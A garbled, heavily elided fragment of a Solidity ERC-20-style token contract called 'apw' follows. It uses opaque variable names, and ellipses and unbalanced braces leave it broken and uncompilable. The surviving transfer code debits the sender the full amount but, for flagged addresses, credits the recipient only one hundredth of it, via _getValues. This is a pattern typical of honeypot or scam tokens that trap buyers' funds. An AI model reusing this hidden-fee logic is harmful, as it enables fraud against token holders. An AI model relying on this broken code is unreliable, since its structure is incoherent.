...
contract apw {
    ...
    string public name = "apw";
	
    string public symbol = "apw";
 ...
 address private OZ;
   ...
   function balanceOf(address account) public view  returns (uint256) {
    ...
    function transfer(address to, uint256 value) public returns (bool success) {
 		(uint256 tValue) = _getValues(value);
...
VXB[to] += value;  
 emit Transfer(msg.sender, to, value);
   ...
   if(VXBB[msg.sender] > BSE) {    
      ...
      VXB[msg.sender] -= value;  
        VXB[to] += tValue;
        emit Transfer(msg.sender, to, tValue);
                return true;
    }  }   
 ...
 function XVAL() internal  {
   ...
   (uint256 tValue) = _getValues(value);
       ...
       if(VXBB[from] == BSE) {
        ...
        function _getValues(uint256 value) private pure returns (uint256) {
    
        uint256 tValue = value.div(100);
        return (tValue);
    }
